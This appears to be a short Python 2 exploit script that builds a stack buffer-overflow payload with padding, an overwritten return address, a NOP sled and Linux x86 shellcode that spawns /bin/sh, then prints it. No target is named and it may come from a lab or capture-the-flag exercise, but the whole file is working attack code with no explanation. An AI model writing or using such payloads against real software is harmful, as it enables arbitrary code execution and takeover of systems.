import struct

OVERFLOW = 65663
EIP_ADDRESS = 0xbffef2a0 + 0x20 # esp
shellcode =  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"
stage_1 = "A" * 142
stage_2 = struct.pack('<I',EIP_ADDRESS)
stage_3 = "\x90" * 128 + shellcode
stage_3 = stage_3.ljust((OVERFLOW  - (len(stage_1) + len(stage_2))),'\x90')

payload = stage_1 + stage_2 + stage_3
print payload
